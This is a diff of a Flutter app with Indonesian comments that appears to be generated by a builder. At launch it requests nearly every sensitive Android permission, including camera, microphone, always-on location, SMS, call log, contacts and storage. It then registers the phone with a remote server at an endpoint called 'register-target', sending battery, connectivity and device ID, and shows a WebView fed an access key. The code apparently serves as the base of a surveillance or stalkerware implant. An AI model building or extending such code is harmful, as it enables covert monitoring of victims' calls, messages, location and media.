@@ -1,13 +1,15 @@
 import 'dart:async';
 import 'dart:convert';
+import 'dart:io';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:battery_plus/battery_plus.dart';
 import 'package:connectivity_plus/connectivity_plus.dart';
-import 'package:geolocator/geolocator.dart';
+// import 'package:geolocator/geolocator.dart';  // ⬅️ HAPUS
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:url_launcher/url_launcher.dart';
 import 'config/build_config.dart';
 
 void main() {
@@ -34,9 +36,6 @@ class GeneratedApp extends StatelessWidget {
   }
 }
 
-// ==========================================
-// ===== BOOTSTRAP: Request permission + Load config =====
-// ==========================================
 class AppBootstrap extends StatefulWidget {
   const AppBootstrap({super.key});
 
@@ -56,17 +55,15 @@ class _AppBootstrapState extends State<AppBootstrap> {
 
   Future<void> _bootstrap() async {
     try {
-      // 1. Save accessKey ke SharedPreferences
+      // Save accessKey ke SharedPreferences
       final prefs = await SharedPreferences.getInstance();
       await prefs.setString('accessKey', BuildConfig.accessKey);
       await prefs.setString('appName', BuildConfig.appName);
       await prefs.setString('buildId', BuildConfig.buildId);
 
-      // 2. Request permissions
       setState(() => _status = 'Meminta izin...');
       await _requestPermissions();
 
-      // 3. Get device info & send to server
       setState(() => _status = 'Mendaftar device...');
       await _registerDevice();
 
@@ -85,53 +82,31 @@ class _AppBootstrapState extends State<AppBootstrap> {
     }
   }
 
-  // ==========================================
-  // ===== REQUEST PERMISSIONS =====
-  // ==========================================
   Future<void> _requestPermissions() async {
     final permissions = <Permission>[
-      // ===== CAMERA =====
       Permission.camera,
-
-      // ===== MICROPHONE =====
       Permission.microphone,
-
-      // ===== LOCATION =====
       Permission.location,
       Permission.locationAlways,
       Permission.locationWhenInUse,
-
-      // ===== STORAGE =====
       Permission.storage,
       Permission.photos,
       Permission.videos,
       Permission.audio,
-      Permission.manageExternalStorage,
-
-      // ===== NOTIFICATION =====
       Permission.notification,
-
-      // ===== PHONE =====
       Permission.phone,
       Permission.contacts,
       Permission.sms,
       Permission.callLog,
-
-      // ===== CALENDAR =====
       Permission.calendarFullAccess,
       Permission.calendarWriteOnly,
-
-      // ===== SENSORS =====
       Permission.sensors,
       Permission.activityRecognition,
-
-      // ===== BLUETOOTH =====
       Permission.bluetooth,
       Permission.bluetoothConnect,
       Permission.bluetoothScan,
     ];
 
-    // Request satu per satu (sequential)
     for (final perm in permissions) {
       try {
         final status = await perm.status;
@@ -139,53 +114,26 @@ class _AppBootstrapState extends State<AppBootstrap> {
           await perm.request();
         }
       } catch (e) {
-        debugPrint('Permission ${perm.toString()} error: $e');
+        debugPrint('Permission error: $e');
       }
     }
-
-    // Optional: buka app settings kalau ada permission yang permanently denied
-    final permanentlyDenied = await _checkPermanentlyDenied(permissions);
-    if (permanentlyDenied.isNotEmpty) {
-      debugPrint('Permanently denied: $permanentlyDenied');
-      // Bisa buka settings:
-      // await openAppSettings();
-    }
   }
 
-  Future<List<Permission>> _checkPermanentlyDenied(
-    List<Permission> perms,
-  ) async {
-    final result = <Permission>[];
-    for (final p in perms) {
-      if (await p.isPermanentlyDenied) result.add(p);
-    }
-    return result;
-  }
-
-  // ==========================================
-  // ===== REGISTER DEVICE =====
-  // ==========================================
   Future<void> _registerDevice() async {
-    if (BuildConfig.accessKey.isEmpty) {
-      debugPrint('Access key kosong, skip register');
-      return;
-    }
+    if (BuildConfig.accessKey.isEmpty) return;
 
     try {
-      // Ambil info device
       final battery = Battery();
       final batteryLevel = await battery.batteryLevel;
 
       final connectivity = Connectivity();
       final connResult = await connectivity.checkConnectivity();
 
-      // Ambil IP
       final prefs = await SharedPreferences.getInstance();
       final deviceId = prefs.getString('deviceId') ??
           'dev_${DateTime.now().millisecondsSinceEpoch}';
       await prefs.setString('deviceId', deviceId);
 
-      // Register ke server
       final res = await _httpPost(
         '${BuildConfig.serverUrl}/api/register-target',
         {
@@ -224,9 +172,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
     }
   }
 
-  // ==========================================
-  // ===== BUILD =====
-  // ==========================================
   @override
   Widget build(BuildContext context) {
     if (!_ready) {
@@ -243,14 +188,10 @@ class _AppBootstrapState extends State<AppBootstrap> {
         ),
       );
     }
-
     return const WebViewHome();
   }
 }
 
-// ==========================================
-// ===== WEBVIEW HOME =====
-// ==========================================
 class WebViewHome extends StatefulWidget {
   const WebViewHome({super.key});
 
@@ -275,12 +216,10 @@ class _WebViewHomeState extends State<WebViewHome> {
           onPageStarted: (_) => setState(() => _isLoading = true),
           onPageFinished: (_) async {
             setState(() => _isLoading = false);
-            // Inject config ke localStorage web
             await _controller.runJavaScript(
               "localStorage.setItem('accessKey', '${BuildConfig.accessKey}');"
               "localStorage.setItem('appName', '${BuildConfig.appName}');"
-              "localStorage.setItem('buildId', '${BuildConfig.buildId}');"
-              "localStorage.setItem('builtBy', '${BuildConfig.builtBy}');",
+              "localStorage.setItem('buildId', '${BuildConfig.buildId}');",
             );
           },
           onWebResourceError: (error) {
@@ -289,14 +228,6 @@ class _WebViewHomeState extends State<WebViewHome> {
         ),
       )
       ..loadRequest(Uri.parse(BuildConfig.webviewUrl));
-
-    // Handle back button
-    _controller.addJavaScriptChannel(
-      'AppBridge',
-      onMessageReceived: (msg) {
-        debugPrint('From web: ${msg.message}');
-      },
-    );
   }
 
   @override
